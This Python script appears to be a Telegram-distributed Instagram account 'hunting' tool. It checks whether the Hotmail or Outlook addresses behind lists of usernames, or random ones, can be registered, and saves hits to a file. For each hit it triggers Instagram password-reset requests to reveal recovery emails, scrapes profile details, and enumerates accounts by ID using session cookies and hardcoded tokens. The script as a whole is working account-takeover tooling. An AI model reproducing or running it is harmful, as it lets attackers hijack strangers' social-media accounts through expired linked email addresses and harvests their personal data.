import requests 
import time
import threading
import random
import os
import uuid
import sys
import json
uuid =str(os.getlogin())
print(uuid)
id1 = "-".join(uuid)
#print(f"ID : {id1}")


print(f'ID : {id1}\nTelegram : @BBMZZ')
time.sleep(1.1)
os.system('clear')
class Checker:
    def __init__(self) :
        self.idf = id1
        self.a = 0
        self.b = 0
        self.f = 0
        self.s = 0
        self.n = 0
        self.j = 0
        self.r = 0
        self.whil = True 
        self.e = 0
        self.u = 0
        self.o = 0
        self.k = 0
        self.num = 0
        self.telegram = "@BBMZZ"
        print(f"[1] - Hotmail\n[2] - Outlook\n[3] - Random Choice Hotmail\n[4] - Call Checker [Hotmail - Outlook]\n[5] - Username 2010 - 2011 \n[!] - Saved the hunt in Name File (acctive.txt)\n[-] - ID : {id1}\n")
        self.un = input("[=] - Enter Your Number list : ")
        if self.un =="1":
            os.system('clear')
            self.hotmail()
        elif self.un =="2":
            os.system('clear')
            self.outlook()
        elif self.un =="3":
            os.system('clear')
            self.ran()
        elif self.un=="4":
            os.system('clear')
            self.me ="This option is in maintenance mode .".upper()
            print(self.me)
            sys.exit()
        elif self.un == "5":
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}/{self.idf}').text
            print(self.url)
            if ('"Subscription":"inactive"') in self.url:
                os.system("clear")
                self.pcs ='No acctive id'
                print(self.pcs)
                exit()
            os.system('clear')
            self.py = "[1] - Username 2010\n[2] - Username 2011\n[3] - Username 2012"
            print(self.py)
            try :

                self.iny = int(input("[=] - Enter Your Number List  : "))
                if self.iny ==1:
                    os.system('clear')
                    self.number1 = 6
                    self.cookie ="12394903"
                    self.username()
                elif self.iny ==2:
                    os.system('clear')
                    self.number1 = 7
                    self.cookie ="12394903"
                    self.username()
                elif self.iny == 3:
                    os.system('clear')
                    self.number1 = 8
                    self.cookie ="12394903"
                    self.username()
                else:
                    self.emn ="Choose an error."


                    print(self.emn)
                    sys.exit()

            except ValueError as error1:
                os.system('clear')
                self.rt = f"Error Choice : {self.iny}"
                print(self.rt)
                sys.exit()
    def username(self):
        os.system('clear')
        self.listnum ="1234567890"
        while self.whil :

            self.ro = str(''.join(random.choice(self.listnum)for i in range(self.number1)))
            url = f'http://i.instagram.com/api/v1/users/{self.ro}/info/'
            headers = {

            'Host': 'i.instagram.com',
            "Cookie":"mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={self.cokiee}",
            'Connection': 'Keep-Alive',
            'User-Agent': 'Instagram 6.12.1 Android (30/11; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; en_IQ)',
            'Accept-Language': 'en-IQ, en-US',
            'X-IG-Connection-Type': 'MOBILE(LTE)',
            'X-IG-Capabilities': 'AQ==',
            'Accept-Encoding': 'gzip',
            }
            rr = requests.get(url,headers=headers).text
            try:
                if 'User not found' in rr:
                    self.iderr = "Tihe ID Error"
                    print(self.iderr)
                else:
                    self.rspo=json.loads(rr)
                    self.user = self.rspo['user']['username']
                    with open('2010.txt','a') as self.izz :
                        self.izz.write(f'{self.user}\n')
                    print(self.user)

            except KeyError as error:
                os.system('clear')
                
                self.pi = "is blook in url - using sessoin id \nWould you like to use Sessionid ? [Y - N]."
                print(self.pi)
                self.ui = input('[=] - Choice : ').lower()
                if self.ui =="y":
                    os.system('clear')
                    self.cookie = input("[=] - Sessoinid : ")
                    self.username()
                elif self.ui =="n":
                    os.system('clear')
                    self.end = "The tool has been closed."
                    sys.exit()
                else:
                    self.emn ="Choose an error."


                    print(self.emn)
                    sys.exit()
                break
                




        
        
    def filecall(self):
        self.fil1 = input("[=] - Enter Your Name File : ")
        try:
            self.ix = open(self.fil1,"r").read().splitlines()
            threading.Thread(target=self.ho1).start()
            threading.Thread(target=self.out).start()
            
           

        except FileNotFoundError as error:
            self.fo = "The Name File Error in Phone .!".upper()
            sys.exit()
    def ho1(self):
        for self.ra in self.ix:
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}/{self.idf}').text
            print(self.url)
            if ('"Subscription":"inactive"') in self.url:
                os.system("clear")
                self.pcs ='No acctive id'
                print(self.pcs)
                exit()
            if ('"OK"') in self.url:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.ra}/{self.idf}').json()['status']

                if self.url2=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.ra}@hotmail.com\n')
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:
                        ge = requests.get(url2,headers=head2).json()
                        id = ge['data']['user']['id']
                        headers1 = {
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            }
                        data3 = {
                            'ig_sig_key_version': '4',
                            "user_id":id
                        }
                        try:
                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                            try:
                                rs =str(res['obfuscated_email'])
                                print(f"Email | {self.ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                                time.sleep(2)
                            except KeyError as error:
                                print('error')
                        except requests.exceptions.ConnectionError as error:
                            continue
                    except requests.exceptions.ConnectionError as error:
                        continue
                    self.a+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
                else:
                    self.s+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
            else:
                self.u+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
        print("Complete File .")
    def out(self):
        for self.ra in self.ix:
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/outlook/{self.ra}/{self.idf}').text
            if ('"Subscription":"inactive"') in self.url:
                os.system("clear")
                self.pcs ='No acctive id'
                print(self.pcs)
                exit()


            elif ('"OK"') in self.url:
                self.url3 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/outlook/zaid/{self.ra}/{self.idf}').json()['status']
                if self.url3=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.ra}@outlook.com\n')
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:
                        ge = requests.get(url2,headers=head2).json()
                        id = ge['data']['user']['id']
                        headers1 = {
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            }
                        data3 = {
                            'ig_sig_key_version': '4',
                            "user_id":id
                        }
                        try:
                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                            try:
                                rs =str(res['obfuscated_email'])
                                print(f"Email | {self.ra}@outlook.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                                time.sleep(2)
                            except KeyError as error:
                                print('error')
                        except requests.exceptions.ConnectionError as error:
                            continue
                    except requests.exceptions.ConnectionError as error:
                        continue
                    self.f+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
                else:
                    self.k+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
            else:
                self.e+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
        print("Complete File .")
        
    def ran(self):
        self.list='qwertyuioplkjhgfdsazxcvvbnm'
        try : 
            self.nmb = int(input("[=] - Enter Your Number Random ? 6...10 : ").upper())
            if self.nmb >5 or self.nmb <11:
                self.number()
              
            elif self.nmb >11:
                self.er1 = "The number is very large.".upper()
                print(self.er1)
                sys.exit()
        except ValueError as error:
            self.er = "Alphabet letters cannot be used".upper()
            print(self.er)
            sys.exit()
    def number(self):
        while True :
            self.rand = str(''.join(random.choice(self.list) for i in range(self.nmb)))
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.rand}/{self.idf}').text
            if ('"Subscription":"inactive"') in self.url: 
                os.system("clear")
                self.pcs ='No acctive id'
                print(self.pcs)
                exit()
            elif ('"OK"') in self.url:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.rand}/{self.idf}').json()['status']
                if self.url2=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.rand}@hotmail.com\n')
                    self.a+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                else:
                    self.s+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
            else:
                self.u+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')



            
    
    def outlook(self):
        self.fil = input("[=] - Enter Your Name File : ".upper())
        try:
            self.ope = open(self.fil,'r').read().splitlines()

        except FileNotFoundError as error:
            self.err="THE NAME FILE ERROR IN PHONE !"
            print(self.err)
            sys.exit()
        for self.ra in self.ope:
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/outlook/{self.ra}/{self.idf}').text
            if ('"Subscription":"inactive"') in self.url:
                os.system("clear")
                self.pcs ='No acctive id'
                print(self.pcs)
                exit()
            elif ('"OK"') in self.url:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/outlook/zaid/{self.ra}/{self.idf}').json()['status']
                if self.url2=='ok':
                    
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:
                        ge = requests.get(url2,headers=head2).json()
                        id = ge['data']['user']['id']
                      
                        fol = ge['data']['user']['edge_followed_by']['count']
                        bio = ge['data']['user']['biography']
                        fols = ge['data']['user']['edge_follow']['count']
                        img = ge['data']['user']['profile_pic_url']
                        nam = ge['data']['user']['full_name']
                        rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                        ree = rl.json()
                        da = ree['date']
                        headers1 = {
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            }
                        data3 = {
                            'ig_sig_key_version': '4',
                            "user_id":id
                        }
                        try:
                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                            try:
                                rs =str(res['obfuscated_email'])
                                print(f"Email | {self.ra}@outlook.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                                with open('acctive.txt','a',encoding="utf-8") as f0:
                                    f0.write(f'Name : {nam}\nFollowers : {fols}\nFollowing : {fol}\nBio : {bio}\nData : {da}\nRest : {rs}\nEmail : {self.ra}@outlook.com\n')
                                time.sleep(2)
                            except KeyError as error:
                                print('error')
                                with open('acctive.txt','a') as f8:
                                    f8.write(f'{self.ra}@outlook.com\n')
                        except requests.exceptions.ConnectionError as error:
                            continue
                    except requests.exceptions.ConnectionError as error:
                        continue
                    self.a+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | O.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                else:
                    self.s+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | O.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
            else:
                self.u+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | O.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
        print("Complete File .")



    def hotmail(self):
        self.fil = input("[=] - Enter Your Name File : ")
        try:
            self.ope = open(self.fil,'r').read().splitlines()

        except FileNotFoundError as error:
            self.err="THE NAME FILE ERROR IN PHONE !"
            print(self.err)
            sys.exit()
        for self.ra in self.ope:
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}/{self.idf}').text
            if ('"Subscription":"inactive"') in self.url:
                os.system("clear")
                self.pcs ='No acctive id'
                print(self.pcs)
                exit()
            elif ('"OK"') in self.url:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.ra}/{self.idf}').json()['status']
                if self.url2=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.ra}@hotmail.com\n')
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:
                        ge = requests.get(url2,headers=head2).json()
                        id = ge['data']['user']['id']
                        fol = ge['data']['user']['edge_followed_by']['count']
                        bio = ge['data']['user']['biography']
                        fols = ge['data']['user']['edge_follow']['count']
                        img = ge['data']['user']['profile_pic_url']
                        nam = ge['data']['user']['full_name']
                        rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                        ree = rl.json()
                        da = ree['date']
                        headers1 = {
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            }
                        data3 = {
                            'ig_sig_key_version': '4',
                            "user_id":id
                        }
                        try:
                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                            try:
                                rs =str(res['obfuscated_email'])
                                print(f"Email | {self.ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                                with open('acctive.txt','a',encoding="utf-8") as f0:
                                    f0.write(f'Name : {nam}\nFollowers : {fols}\nFollowing : {fol}\nBio : {bio}\nData : {da}\nRest : {rs}\nEmail : {self.ra}@hotmail.com\n')
                                time.sleep(2)
                            except KeyError as error:
                                with open('acctive.txt','a') as f8:
                                    f8.write(f'{self.ra}@hotmail.com\n')
                        except requests.exceptions.ConnectionError as error:
                            continue
                    except requests.exceptions.ConnectionError as error:
                        continue
                    self.a+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                else:
                    self.s+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
            else:
                self.u+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
        print("Complete File .")



Checker()
    
